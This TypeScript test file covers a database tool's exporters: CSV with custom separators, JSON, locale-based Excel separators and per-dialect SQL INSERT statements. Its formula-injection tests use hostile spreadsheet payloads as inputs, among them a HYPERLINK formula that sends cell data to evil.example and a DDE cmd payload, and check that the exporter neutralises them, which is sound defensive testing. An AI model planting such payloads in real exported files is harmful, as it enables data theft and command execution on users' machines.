import { describe, expect, it } from "vitest";
import type { ColumnInfo, Value, ValueKind } from "../../core/contract";
import { parseCsv } from "./csv";
import { excelSeparator, exportDelimited, exportRows } from "./exporters";

const column = (name: string, kind: ValueKind["kind"] = "text", vectorDims?: number): ColumnInfo => ({
  name,
  typeName: kind,
  kind: { kind } as ValueKind,
  nullable: true,
  default: null,
  comment: null,
  identity: null,
  generated: null,
  hints: vectorDims ? { vectorDims } : {},
});

const text = (v: string): Value => ({ t: "text", v });
const int = (v: number): Value => ({ t: "int", v });
const NULL: Value = { t: "null", v: null };
const vector: Value = { t: "other", type: "vector", v: "[0.1,0.2,0.3,0.4]" };

describe("exportDelimited", () => {
  const columns = [column("id", "int"), column("note"), column("embedding", "other", 4)];
  const rows = [
    [int(1), text("Line 1\r\nLine 2"), vector],
    [int(2), text('say "hi"; bye'), NULL],
    [int(3), NULL, NULL],
  ];

  it("keeps multi-line cells in one record and quotes the separator", () => {
    const csv = exportDelimited(columns, rows, ";");
    expect(parseCsv(csv, ";")).toEqual([
      ["id", "note"],
      ["1", "Line 1\r\nLine 2"],
      ["2", 'say "hi"; bye'],
      ["3", ""],
    ]);
  });

  it("matches the comma CSV export when the separator is a comma", () => {
    expect(exportDelimited(columns, rows, ",")).toBe(exportRows("csv", columns, rows, "t", "mysql"));
  });

  it("leaves a comma unquoted when it is not the separator", () => {
    expect(exportDelimited([column("a")], [[text("x,y")]], ";")).toBe("a\r\nx,y");
  });
});

describe("formula injection", () => {
  const cell = (value: Value, separator = ",") => exportDelimited([column("a")], [[value]], separator).split("\r\n")[1];

  it("prefixes a cell a spreadsheet would evaluate with a quote and quotes the field", () => {
    expect(cell(text('=HYPERLINK("http://evil.example/?"&A1,"x")'))).toBe('"\'=HYPERLINK(""http://evil.example/?""&A1,""x"")"');
    expect(cell(text("-2+3+cmd|' /C calc'!A0"))).toBe("\"'-2+3+cmd|' /C calc'!A0\"");
    expect(cell(text("+1"))).toBe('"\'+1"');
    expect(cell(text("@SUM(A1)"))).toBe('"\'@SUM(A1)"');
    expect(cell(text("\tx"))).toBe('"\'\tx"');
    expect(cell(text("\rx"))).toBe('"\'\rx"');
    expect(cell(text("-Infinity"))).toBe('"\'-Infinity"');
  });

  it("keeps plain numbers, also negative ones, as they are", () => {
    expect(cell(int(-5))).toBe("-5");
    expect(cell({ t: "float", v: -1.5e-7 })).toBe("-0.00000015");
    expect(cell({ t: "decimal", v: "-0.000100" })).toBe("-0.000100");
    expect(cell(text("-1E+3"))).toBe("-1E+3");
    expect(cell(text("-1e5"))).toBe("-1e5");
  });

  it("neutralises headers too, and with any separator", () => {
    expect(exportDelimited([column("=cmd")], [[int(1)]], ";")).toBe('"\'=cmd"\r\n1');
    expect(cell(text("=1;2"), ";")).toBe('"\'=1;2"');
  });

  it("applies to the comma CSV export", () => {
    expect(exportRows("csv", [column("a")], [[text("=1")]], "t", "ansi")).toBe('a\r\n"\'=1"');
    expect(parseCsv(exportRows("csv", [column("a")], [[text("=1")]], "t", "ansi"), ",")).toEqual([["a"], ["'=1"]]);
  });
});

describe("JSON export", () => {
  it("keeps numbers, booleans, NULL and documents typed", () => {
    const columns = [column("id", "int"), column("ok", "bool"), column("meta", "json"), column("note")];
    const rows: Value[][] = [[int(1), { t: "bool", v: true }, { t: "json", v: '{"a":[1,2]}' }, NULL]];
    expect(JSON.parse(exportRows("json", columns, rows, null, "ansi"))).toEqual([{ id: 1, ok: true, meta: { a: [1, 2] }, note: null }]);
  });
});

describe("excelSeparator", () => {
  it("follows the locale's decimal separator", () => {
    expect(excelSeparator("en-US")).toBe(",");
    expect(excelSeparator("en-GB")).toBe(",");
    expect(excelSeparator("vi-VN")).toBe(";");
    expect(excelSeparator("de-DE")).toBe(";");
  });
});

describe("INSERT export per dialect", () => {
  const columns = [column("Id", "int"), column("Name")];
  const rows = [[int(1), text("it's")]];

  it("quotes for MySQL", () => {
    expect(exportRows("insert", columns, rows, "orders", "mysql")).toBe("INSERT INTO `orders` (`Id`, `Name`) VALUES (1, 'it''s');");
  });

  it("quotes for SQL Server, splitting schema.table", () => {
    expect(exportRows("insert", columns, rows, "sales.Invoices", "tsql")).toBe("INSERT INTO [sales].[Invoices] ([Id], [Name]) VALUES (1, N'it''s');");
  });

  it("quotes for ANSI engines", () => {
    expect(exportRows("insert", columns, rows, "public.orders", "ansi")).toBe(`INSERT INTO "public"."orders" ("Id", "Name") VALUES (1, 'it''s');`);
  });

  it("writes typed literals: NULL, booleans, bytes", () => {
    const typed = [column("a", "bool"), column("b", "bytes"), column("c")];
    const values: Value[][] = [[{ t: "bool", v: false }, { t: "bytes", v: "0xcafe" }, NULL]];
    expect(exportRows("insert", typed, values, "t", "mysql")).toBe("INSERT INTO `t` (`a`, `b`, `c`) VALUES (0, 0xcafe, NULL);");
    expect(exportRows("insert", typed, values, "t", "ansi")).toBe(`INSERT INTO "t" ("a", "b", "c") VALUES (FALSE, X'cafe', NULL);`);
  });
});
